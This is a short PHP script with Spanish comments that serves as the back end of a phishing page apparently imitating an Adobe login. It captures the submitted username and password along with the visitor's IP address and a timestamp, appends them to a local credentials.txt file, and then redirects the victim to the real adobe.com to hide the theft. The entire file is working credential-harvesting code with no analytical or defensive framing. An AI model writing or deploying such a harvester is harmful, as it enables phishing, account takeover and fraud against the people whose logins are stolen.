<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    
    // Obtener la IP del cliente
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Fecha y hora
    $fecha = date("Y-m-d H:i:s");

    // Guardar en archivo
    $archivo = 'credentials.txt';
    $datos = "[$fecha] IP: $ip | Usuario: $usuario | Clave: $clave\n";
    file_put_contents($archivo, $datos, FILE_APPEND);

    // Redirigir a la página real de Adobe
    header("Location: https://www.adobe.com");
    exit();
}
?>
